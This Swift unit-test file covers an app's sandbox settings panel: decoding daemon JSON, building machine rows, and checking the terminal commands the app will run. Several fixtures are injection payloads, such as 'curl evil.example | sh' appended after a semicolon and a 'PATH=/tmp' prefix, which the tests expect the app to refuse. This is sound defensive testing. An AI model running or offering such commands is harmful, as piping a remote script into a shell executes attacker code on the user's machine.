import XCTest
import Foundation
@testable import CapcomdStore

/// A daemon that describes its places (ADR-021 phase 1), or doesn't.
final class FakeSandboxDaemon: DaemonInfoFetching, @unchecked Sendable {
  var caps: Set<String> = [Capability.runsOptions, Capability.logins, Capability.environments, Capability.sandboxes, Capability.sandboxesResources]
  var list: [SandboxDescriptor] = [SandboxDescriptor(name: "boxd", label: "Cloud", kind: "cloud", vendor: "boxd", title: "Cloud · boxd", mark: "boxd",
                                                     caps: SandboxCaps(hostBoundSecrets: true, shell: true), available: true)]
  var details: [String: SandboxDetail] = [:]
  var pages: [String: ResourcePage] = [:]
  var commands: [String: String] = [:]
  var resourcesFail = false
  var resourceCalls = 0
  func capabilities() async throws -> Set<String> { caps }
  func health() async throws -> DaemonHealth { DaemonHealth(version: "0.7.0", capabilities: caps) }
  func skills() async throws -> [SkillInfo] { [] }
  func sandboxes() async throws -> [SandboxDescriptor] { list }
  func sandbox(_ name: String) async throws -> SandboxDetail {
    guard let d = details[name] else { throw DetailUnavailable.failed("not found") }
    return d
  }
  func resources(sandbox: String) async throws -> ResourcePage {
    resourceCalls += 1
    if resourcesFail { throw DetailUnavailable.failed("HTTP 500") }
    return pages[sandbox] ?? ResourcePage(resources: [])
  }
  func resource(sandbox: String, id: String) async throws -> ResourceDetail {
    resourceCalls += 1
    guard let c = commands[id] else { throw DetailUnavailable.failed(SandboxRows.gone) }
    return ResourceDetail(resource: nil, terminalCommand: c)
  }
}

@MainActor
final class SandboxesTests: XCTestCase {
  let now = SettingsRows.parseISO("2026-10-27T10:00:00.000Z")!

  // MARK: decoding

  func testDecodesTheListDroppingUnlistedProvidersAndReadingUnknownKindsAsCloud() throws {
    let list = try SandboxWire.sandboxes(Data(#"""
      {"sandboxes":[
        {"name":"docker","descriptorVersion":1,"label":"Local","kind":"local","vendor":"Docker","title":"Local · Docker","mark":"docker","listed":true,
         "caps":{"isolation":"container","snapshots":true,"hostBoundSecrets":false,"egressAllowlist":false,"interactive":true,"idleLifetime":"sweep","shell":true,"costs":false,"teleport":true},
         "settings":["idleLifetime"],"info":["logins","checkpoints"],"resourceKinds":["machine"],"actions":["open_terminal","delete"],"available":false,"reason":"Docker isn't running","default":false},
        {"name":"boxd","label":"Cloud","kind":"cloud","vendor":"boxd","mark":"boxd","caps":{"isolation":"vm","hostBoundSecrets":true,"shell":true},"available":true,"reason":null,"default":true},
        {"name":"fake","label":"Fake","kind":"local","listed":false,"caps":{}},
        {"name":"lima","label":"Local VM","kind":"hypervisor","vendor":"Lima","mark":"lima","caps":{"isolation":"vm"}},
        {"label":"no name: dropped, not fatal"}
      ]}
      """#.utf8))
    XCTAssertEqual(list.map(\.name), ["docker", "boxd", "lima"])
    let docker = list[0]
    XCTAssertEqual(docker.kind, .local)
    XCTAssertEqual(docker.caps.isolation, "container")
    XCTAssertEqual(docker.caps.idleLifetime, "sweep")
    XCTAssertEqual(docker.caps.hostBoundSecrets, false)
    XCTAssertEqual(docker.available, false)
    XCTAssertEqual(docker.reason, "Docker isn't running")
    XCTAssertEqual(docker.displayTitle, "Local · Docker")
    XCTAssertEqual(list[1].isDefault, true)
    XCTAssertEqual(list[1].displayTitle, "Cloud · boxd")   // no title: label · vendor
    XCTAssertEqual(list[2].kind, .cloud)                    // an unknown kind renders as cloud
    XCTAssertEqual(list[2].displayTitle, "Local VM · Lima")
  }

  func testDecodesDetailFieldsIncludingAnUnknownType() throws {
    let d = try SandboxWire.detail(Data(#"""
      {"descriptor":{"name":"boxd","label":"Cloud","kind":"cloud","vendor":"boxd","caps":{"shell":true}},
       "settings":[
         {"id":"idleLifetime","type":"choice","label":"Delete idle machines after","help":"A machine left behind is deleted after this.",
          "value":"3600","display":"1 hour","default":"3600",
          "choices":[{"value":"900","label":"15 minutes"},{"value":3600,"label":"1 hour"},{"value":"14400","label":"4 hours"},{"value":"43200","label":"12 hours"}],
          "source":"default","editable":true,"appliesTo":"new_runs","needsRestart":false},
         {"id":"keepWarm","type":"toggle","label":"Keep one machine warm","value":true},
         {"id":"region","type":"region-map","label":"Region","value":{"lat":50.1,"lon":8.7},"display":"Frankfurt"},
         {"type":"choice","label":"no id: dropped"}
       ],
       "info":[
         {"id":"apiKey","type":"status","label":"API key","value":"saved","display":"Saved in your keychain","state":"ok"},
         {"id":"checkpoints","type":"info","label":"Checkpoints","value":600000,"display":"After each commit and every 10 minutes"},
         {"id":"logins","type":"info","label":"Logins","value":"bound","display":"Bound"}
       ],
       "rev":7}
      """#.utf8))
    XCTAssertEqual(d.rev, "7")
    XCTAssertEqual(d.settings.map(\.id), ["idleLifetime", "keepWarm", "region"])
    let idle = d.settings[0]
    XCTAssertEqual(idle.kind, .choice)
    XCTAssertEqual(idle.choices.map(\.value), ["900", "3600", "14400", "43200"])   // a number reads as its text
    XCTAssertEqual(idle.value.text, "3600")
    XCTAssertEqual(idle.shown, "1 hour")
    XCTAssertTrue(idle.editable)
    XCTAssertFalse(idle.fromEnvironment)
    XCTAssertEqual(d.settings[1].kind, .toggle)
    XCTAssertEqual(d.settings[1].value.bool, true)
    XCTAssertEqual(d.settings[1].shown, "On")
    // A type this app doesn't know: its label and the daemon's text, read-only.
    let region = d.settings[2]
    XCTAssertEqual(region.kind, .other("region-map"))
    XCTAssertEqual(region.value, .null)
    XCTAssertEqual(region.shown, "Frankfurt")
    XCTAssertFalse(region.editable)
    XCTAssertEqual(d.info[0].kind, .status)
    XCTAssertEqual(d.info[0].state, "ok")
    XCTAssertEqual(d.info[1].value.text, "600000")

    // Rows land in the board's sections: the key with the status, the idle lifetime under the machines, Logins then
    // Checkpoints in Safety, and the rest in their own section.
    let s = SandboxRows.sections(d)
    XCTAssertEqual(s.status.map(\.id), ["apiKey"])
    XCTAssertEqual(s.machines.map(\.id), ["idleLifetime"])
    XCTAssertEqual(s.safety.map(\.id), ["logins", "checkpoints"])
    XCTAssertEqual(s.more.map(\.id), ["keepWarm", "region"])
  }

  func testAChoiceWithoutDisplayShowsItsChoiceAndAnEnvironmentValueIsNotEditable() {
    let choices = [SandboxField.Choice(value: "900", label: "15 minutes"), SandboxField.Choice(value: "3600", label: "1 hour")]
    XCTAssertEqual(SandboxField(id: "idleLifetime", type: "choice", label: "x", value: .string("900"), choices: choices).shown, "15 minutes")
    XCTAssertEqual(SandboxField(id: "idleLifetime", type: "choice", label: "x", value: .number(7200), choices: choices).shown, "7200")
    let env = SandboxField(id: "idleLifetime", type: "choice", label: "x", value: .string("7200"),
                           display: "Set by CAPCOMD_SANDBOX_IDLE_SECONDS in capcomd's environment", choices: choices, source: "env")
    XCTAssertTrue(env.fromEnvironment)
    XCTAssertEqual(env.shown, "Set by CAPCOMD_SANDBOX_IDLE_SECONDS in capcomd's environment")
  }

  func testDecodesResourcesOwnedOrphanedAndStale() throws {
    let page = try SandboxWire.resources(Data(#"""
      {"resources":[
        {"id":"relay-3f9c2a1b7e5d4c60","kind":"machine","state":"running","owner":{"runId":"run-8kq2","agentId":"agt-41","role":"worker","task":"Add an abs(a) function…\nand tests"},
         "createdAt":"2026-10-27T09:56:00.000Z","deleteAfter":"2026-10-27T11:06:00.000Z","cost":null,"actions":["open_terminal","delete"]},
        {"id":"relay-0c11d5e2a9b74f08","kind":"machine","state":"orphaned","owner":null,"createdAt":"2026-10-27T08:00:00.000Z","deleteAfter":"2026-10-27T10:12:00.000Z","actions":["open_terminal","delete"]},
        {"id":"relay-77ab0e94c2d81f35","kind":"machine","state":"running","owner":{"runId":"run-8kq2","agentId":"agt-43","role":"reviewer","task":"Review it"},
         "createdAt":"2026-10-27T09:59:00Z","actions":["open_terminal"]},
        {"id":"relay-starting","state":"starting","owner":{"runId":"run-8kq2","agentId":"agt-44","role":"worker"},"createdAt":"2026-10-27T09:59:50Z","actions":[]},
        {"kind":"machine"}
      ],"asOf":"2026-10-27T09:59:20.000Z","stale":true,"error":{"code":"unavailable","message":"boxd didn't answer within 3 s"},"next":null}
      """#.utf8))
    XCTAssertTrue(page.stale)
    XCTAssertEqual(page.error, "boxd didn't answer within 3 s")
    XCTAssertEqual(page.resources.count, 4)
    XCTAssertFalse(page.resources[0].orphaned)
    XCTAssertTrue(page.resources[1].orphaned)

    let rows = SandboxRows.machines(page, descriptor: nil, now: now)
    // Owned machines first, newest first; the one left behind last.
    XCTAssertEqual(rows.map(\.id), ["relay-starting", "relay-77ab0e94c2d81f35", "relay-3f9c2a1b7e5d4c60", "relay-0c11d5e2a9b74f08"])
    XCTAssertEqual(rows.map(\.title), ["worker", "reviewer · Review it", "worker · Add an abs(a) function…", "Left behind · no agent owns it"])
    XCTAssertEqual(rows.map(\.age), ["now", "1 min", "4 min", "2 h"])
    XCTAssertEqual(rows.map(\.tone), [.empty, .ok, .ok, .warn])
    XCTAssertEqual(rows.map(\.canOpenTerminal), [false, true, true, true])
    XCTAssertEqual(rows[2].deleteAfter, SettingsRows.parseISO("2026-10-27T11:06:00.000Z"))

    // A provider without a shell offers no Open in Terminal, whatever a resource says.
    let noShell = SandboxDescriptor(name: "x", label: "X", caps: SandboxCaps(shell: false))
    XCTAssertTrue(SandboxRows.machines(page, descriptor: noShell, now: now).allSatisfy { !$0.canOpenTerminal })

    let fresh = try SandboxWire.resources(Data(#"{"resources":[],"asOf":"2026-10-27T10:00:00Z","stale":false,"error":null,"next":null}"#.utf8))
    XCTAssertFalse(fresh.stale)
    XCTAssertNil(fresh.error)
    XCTAssertTrue(SandboxRows.machines(fresh, descriptor: nil).isEmpty)
  }

  func testDecodesOneResourceFlatOrNestedWithItsTerminalCommand() throws {
    let flat = try SandboxWire.resource(Data(#"{"id":"relay-1","kind":"machine","state":"running","owner":{"runId":"run-8kq2","agentId":"agt-41"},"actions":["open_terminal"],"terminalCommand":"capcomd sandbox shell run-8kq2 agt-41"}"#.utf8))
    XCTAssertEqual(flat.resource?.id, "relay-1")
    XCTAssertEqual(flat.terminalCommand, "capcomd sandbox shell run-8kq2 agt-41")
    let nested = try SandboxWire.resource(Data(#"{"resource":{"id":"relay-0c11","state":"orphaned","owner":null},"terminalCommand":"capcomd sandbox shell --sandbox boxd --machine relay-0c11"}"#.utf8))
    XCTAssertEqual(nested.resource?.id, "relay-0c11")
    XCTAssertTrue(nested.resource?.orphaned == true)
    XCTAssertEqual(nested.terminalCommand, "capcomd sandbox shell --sandbox boxd --machine relay-0c11")
  }

  func testAges() {
    XCTAssertEqual(SandboxRows.age(from: now.addingTimeInterval(-20), now: now), "now")
    XCTAssertEqual(SandboxRows.age(from: now.addingTimeInterval(-60), now: now), "1 min")
    XCTAssertEqual(SandboxRows.age(from: now.addingTimeInterval(-3599), now: now), "59 min")
    XCTAssertEqual(SandboxRows.age(from: now.addingTimeInterval(-7200), now: now), "2 h")
    XCTAssertEqual(SandboxRows.age(from: now.addingTimeInterval(-3 * 86_400), now: now), "3 d")
    XCTAssertEqual(SandboxRows.age(from: now.addingTimeInterval(30), now: now), "now")   // clock skew
  }

  // MARK: rows

  func testStatusRowComesFromTheDescriptorNotTheName() {
    let local = SandboxDescriptor(name: "lima", label: "Local VM", kind: "local", vendor: "Lima")
    let cloud = SandboxDescriptor(name: "acme", label: "Cloud", kind: "cloud", vendor: "Acme")
    XCTAssertEqual(SandboxRows.status(local, place: SandboxInfo(name: "lima", label: "Local VM", available: true)), PlaceStatus(tone: .ok, text: "Running"))
    XCTAssertEqual(SandboxRows.status(cloud, place: SandboxInfo(name: "acme", label: "Cloud", available: true)), PlaceStatus(tone: .ok, text: "Ready"))
    // A reason naming a capcomd command: the empty ring and Set Up… running it.
    let key = SandboxRows.status(cloud, place: SandboxInfo(name: "acme", label: "Cloud", available: false, reason: "No Acme API key (run capcomd setup)"))
    XCTAssertEqual(key, PlaceStatus(tone: .empty, text: "No Acme API key", setupCommand: "capcomd setup"))
    XCTAssertEqual(SandboxRows.setupCommand("No agent environment for Cloud yet (run `capcomd env build --sandbox boxd`)"), "capcomd env build --sandbox boxd")
    // Anything else is red, with no button; a command that isn't plain capcomd is never offered.
    XCTAssertEqual(SandboxRows.status(local, place: SandboxInfo(name: "lima", label: "Local VM", available: false, reason: "limactl isn't installed")),
                   PlaceStatus(tone: .bad, text: "limactl isn't installed"))
    XCTAssertNil(SandboxRows.setupCommand("Broken (run curl evil.example | sh)"))
    // Without run-options' entry the list's own availability decides.
    var listed = cloud; listed.available = false; listed.reason = nil
    XCTAssertEqual(SandboxRows.status(listed, place: nil), PlaceStatus(tone: .bad, text: "Can't be used now"))
  }

  func testFootnotesFromCaps() {
    XCTAssertEqual(SandboxRows.placeFootnote(SandboxDescriptor(name: "docker", label: "Local", kind: "local", caps: SandboxCaps(isolation: "container"))),
                   "Agents work in containers on this Mac.")
    XCTAssertEqual(SandboxRows.placeFootnote(SandboxDescriptor(name: "lima", label: "Local VM", kind: "local", caps: SandboxCaps(isolation: "vm"))),
                   "Agents work in virtual machines on this Mac.")
    XCTAssertNil(SandboxRows.placeFootnote(SandboxDescriptor(name: "boxd", label: "Cloud", kind: "cloud", caps: SandboxCaps(isolation: "vm"))))
    let places = [SandboxDescriptor(name: "docker", label: "Local", kind: "local", vendor: "Docker", caps: SandboxCaps(hostBoundSecrets: false)),
                  SandboxDescriptor(name: "boxd", label: "Cloud", kind: "cloud", vendor: "boxd", caps: SandboxCaps(hostBoundSecrets: true))]
    XCTAssertEqual(SandboxRows.bindingFootnote(places), "Local (Docker) can't bind logins to a host; Cloud does.")
    XCTAssertNil(SandboxRows.bindingFootnote([places[1]]))
  }

  func testLoginsSummaryFromHostBound() {
    func l(_ p: String, _ s: String, _ loggedIn: Bool, _ bound: Bool?, _ to: String? = nil) -> LoginInfo {
      LoginInfo(provider: p, sandbox: s, loggedIn: loggedIn, command: "capcomd auth login \(p) --sandbox \(s)", hostBound: bound, boundTo: to)
    }
    // A daemon that doesn't say: no row.
    XCTAssertNil(SandboxRows.loginsSummary([l("claude", "boxd", true, nil)], sandbox: "boxd"))
    XCTAssertNil(SandboxRows.loginsSummary([l("claude", "docker", true, false)], sandbox: "boxd"))
    let all = SandboxRows.loginsSummary([l("claude", "boxd", true, true, "api.anthropic.com"), l("codex", "boxd", false, false)], sandbox: "boxd")
    XCTAssertEqual(all?.tone, .ok)
    XCTAssertEqual(all?.text, "Bound")
    XCTAssertTrue(all?.sub.contains("api.anthropic.com") == true)
    let some = SandboxRows.loginsSummary([l("claude", "boxd", true, true, "api.anthropic.com"), l("codex", "boxd", true, false)], sandbox: "boxd")
    XCTAssertEqual(some?.tone, .warn)
    XCTAssertEqual(some?.text, "Codex isn't bound")
    let none = SandboxRows.loginsSummary([l("claude", "docker", true, false), l("codex", "docker", true, false)], sandbox: "docker")
    XCTAssertEqual(none?.text, "Not bound")
    XCTAssertEqual(none?.tone, Tone.none)
    XCTAssertEqual(SandboxRows.loginsSummary([l("claude", "boxd", false, false)], sandbox: "boxd")?.text, "No logins")
  }

  // MARK: store

  func testAnOlderDaemonHasNoDescriptorsAndNoMachines() async {
    let daemon = FakeSandboxDaemon()
    daemon.caps = [Capability.runsOptions, Capability.logins, Capability.environments]
    let s = CapcomdStore(daemonInfo: daemon)
    await s.refreshSettings()
    XCTAssertEqual(s.sandboxList, .unavailable(.unsupported))
    XCTAssertNil(s.sandboxDescriptor("boxd"))
    await s.refreshSandbox("boxd")
    XCTAssertEqual(s.sandboxDetails["boxd"], .unavailable(.unsupported))
    XCTAssertEqual(s.sandboxResources["boxd"], .unavailable(.unsupported))
    XCTAssertEqual(daemon.resourceCalls, 0)
    let open = await s.terminalCommand(sandbox: "boxd", resource: "relay-1")
    XCTAssertEqual(open, .unavailable("Update capcomd to open machines from here."))
  }

  func testWithSandboxesButNotResourcesTheMachinesAreUnsupported() async {
    let daemon = FakeSandboxDaemon()
    daemon.caps.remove(Capability.sandboxesResources)
    daemon.details["boxd"] = SandboxDetail(descriptor: daemon.list[0])
    let s = CapcomdStore(daemonInfo: daemon)
    await s.refreshSettings()
    XCTAssertEqual(s.sandboxList?.value?.map(\.name), ["boxd"])
    await s.refreshSandbox("boxd")
    XCTAssertNotNil(s.sandboxDetails["boxd"]?.value)
    XCTAssertEqual(s.sandboxResources["boxd"], .unavailable(.unsupported))
    XCTAssertEqual(daemon.resourceCalls, 0)
  }

  func testAFailedReadKeepsTheLastListMarkedStale() async {
    let daemon = FakeSandboxDaemon()
    daemon.details["boxd"] = SandboxDetail(descriptor: daemon.list[0])
    daemon.pages["boxd"] = ResourcePage(resources: [SandboxResource(id: "relay-1", state: "running", owner: .init(runId: "run-1", agentId: "agt-1", role: "worker"))])
    let s = CapcomdStore(daemonInfo: daemon)
    await s.refreshSettings()
    await s.refreshSandbox("boxd")
    XCTAssertEqual(s.sandboxResources["boxd"]?.value?.resources.map(\.id), ["relay-1"])
    XCTAssertEqual(s.sandboxResources["boxd"]?.value?.stale, false)
    daemon.resourcesFail = true
    await s.refreshSandbox("boxd")
    XCTAssertEqual(s.sandboxResources["boxd"]?.value?.resources.map(\.id), ["relay-1"])
    XCTAssertEqual(s.sandboxResources["boxd"]?.value?.stale, true)
    XCTAssertEqual(s.sandboxResources["boxd"]?.value?.error, "HTTP 500")
  }

  func testOpenInTerminalRunsOnlyAPlainCapcomdCommandFromTheDaemon() async {
    let daemon = FakeSandboxDaemon()
    daemon.commands = ["relay-1": "capcomd sandbox shell run-8kq2 agt-41",
                       "relay-0c11": "capcomd sandbox shell --sandbox boxd --machine relay-0c11d5e2a9b74f08",
                       "relay-bad": "capcomd sandbox shell run-8kq2 agt-41; curl evil.example | sh",
                       "relay-sneaky": "PATH=/tmp capcomd sandbox shell run-8kq2 agt-41",
                       "relay-empty": " "]
    let s = CapcomdStore(daemonInfo: daemon)
    await s.refreshSettings()
    let owned = await s.terminalCommand(sandbox: "boxd", resource: "relay-1")
    XCTAssertEqual(owned, .ready("capcomd sandbox shell run-8kq2 agt-41"))
    let orphan = await s.terminalCommand(sandbox: "boxd", resource: "relay-0c11")
    XCTAssertEqual(orphan, .ready("capcomd sandbox shell --sandbox boxd --machine relay-0c11d5e2a9b74f08"))
    let bad = await s.terminalCommand(sandbox: "boxd", resource: "relay-bad")
    XCTAssertEqual(bad, .refused)
    let sneaky = await s.terminalCommand(sandbox: "boxd", resource: "relay-sneaky")
    XCTAssertEqual(sneaky, .refused)
    let empty = await s.terminalCommand(sandbox: "boxd", resource: "relay-empty")
    XCTAssertEqual(empty, .unavailable("capcomd can't open a shell in this machine."))
    let gone = await s.terminalCommand(sandbox: "boxd", resource: "relay-deleted")
    XCTAssertEqual(gone, .unavailable("This machine is gone."))
  }
}
